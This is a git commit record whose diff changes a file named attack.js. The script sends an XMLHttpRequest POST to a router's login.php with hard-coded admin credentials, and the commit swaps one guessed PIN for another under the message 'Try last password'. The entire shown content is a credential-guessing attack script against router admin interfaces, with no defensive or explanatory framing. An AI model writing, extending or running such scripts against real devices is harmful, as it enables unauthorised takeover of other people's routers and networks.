3ab49972434846d78f10fd6b482bb1ccc98bb8f2
Daniel Spencer <danielspencer305@hotmail.co.uk>
2022-03-03 18:32:09 -0500

    Try last password

--- attack.js
+++ attack.js
@@ -26,7 +26,7 @@ xhr.onreadystatechange = function() {
 //xhr.open("GET", ROUTER, true);
 //xhr.send('');
 
-const formParams = "username=admin&pin=secured";
+const formParams = "username=admin&pin=123456";
 
 xhr.open("POST", ROUTER + "/login.php", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
